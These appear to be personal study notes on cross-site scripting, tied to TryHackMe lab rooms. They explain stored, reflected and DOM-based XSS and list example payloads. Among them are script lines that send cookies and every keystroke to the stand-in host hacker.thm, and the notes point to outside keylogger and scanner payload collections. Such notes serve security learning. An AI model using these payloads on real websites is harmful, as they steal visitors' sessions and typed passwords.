# Tools (with account created!!!!)
https://xsshunter.com/app

# Introduction
https://tryhackme.com/room/xss
https://tryhackme.com/room/xssgi

Take profit of unsanitized user input.
Can be JS, VBScript, CSS.

## Stored XSS
Malicious string is inside website's DB

## Reflected XSS
Malicious payload a victim will send to the website.
The attacker will need a way to make the victim send the payload.

Examples:
```
Popup's (<script>alert("Hello World")</script>)
Creates a Hello World message popup on a users browser.

Writing HTML (document.write)
Override the website's HTML to add your own (essentially defacing the entire page).

XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.

Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html)
A mini local port scanner (more information on this is covered in the TryHackMe XSS room).
```

## DOM-Based XSS
DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the <script></script> HTML tag.

For example, sending HTML directly in a search bar.

# Payloads
```
<script>alert(document.cookie)</script>
<script>alert("Hello World")</script>
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

For more:
XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.
```